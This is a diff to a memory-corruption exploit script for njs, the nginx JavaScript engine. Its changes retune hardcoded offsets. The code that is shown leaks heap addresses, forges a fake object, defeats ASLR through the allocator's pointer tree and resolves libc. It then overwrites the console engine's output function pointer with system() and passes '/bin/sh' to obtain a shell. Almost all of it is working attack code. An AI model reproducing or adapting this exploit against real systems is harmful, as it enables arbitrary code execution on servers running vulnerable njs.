@@ -218,13 +218,14 @@ let offset = part_raw.indexOf(raw_buf);
 if(offset == -1) { throw new Error('Exploit failed, offset is -1'); }
 
 console.log(`[*] offset: ${offset}`);
-let addrof_ptr3 = ptr_u64(heap_ptr_raw_3)+offset-0x3300; // offset to beginning of chunk is not accurate
+let addrof_ptr3 = ptr_u64(heap_ptr_raw_3)+offset-0x3300; // this changes between systems
 let start_ptr3 = ptr_p64(addrof_ptr3);
 console.log(`[?] addrof raw_buf = 0x${(addrof_ptr3).toString(16)}`);
 
 
 // step 2 - build a fakeObj primitive
 fakeObj = get_forged_ta(addrof_ptr3+0x100);
+// typeof fakeObj
 
 // step 3 - break ASLR
 console.log("[*] Scanning the allocator's ptr tree");
@@ -244,23 +245,25 @@ for(let i=0; i<0x100;i++) {
 
 console.log(`[+] njs_mp_rbtree_compare @ 0x${rbtree_cmp.toString(16)}`);
 
-let njs_base = rbtree_cmp - 0x12dcd;
+let njs_base = rbtree_cmp - 0x16c70;
 console.log(`[*] njs base @ 0x${njs_base.toString(16)}`);
-let plt_open = ptr_u64(arb_read(njs_base+0xb8d08));
+let plt_open = ptr_u64(arb_read(njs_base+0xc6af0));
 console.log(`[*] libc open @ 0x${plt_open.toString(16)}`);
-let libc_base = plt_open - 0x1144e0;
+let libc_base = plt_open - 0x10df00;
 console.log(`[*] libc base @ 0x${libc_base.toString(16)}`);
 
 // step 4 - Overwrite `njs_console->engine->output()` function ptr
-let njs_console = njs_base+0xc68c0;
+let njs_console = njs_base+0xd56e0;
 console.log(`[*] njs_console @ 0x${njs_console.toString(16)}`);
 let engine = ptr_u64(arb_read(njs_console));
 console.log(`[*] njs_console->engine @ 0x${engine.toString(16)}`);
 let fcn_ptr = engine+0x40;
 console.log(`[*] njs_console->engine->output @ 0x${fcn_ptr.toString(16)}`);
 
-let libc_system = libc_base+0x50d70;
+let libc_system = libc_base+0x52290;
 
 arb_write(engine, [0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0]);
 arb_write(fcn_ptr, ptr_p64(libc_system));
 console.log("[*] jumping to system(), go go go");
+
+// EOF
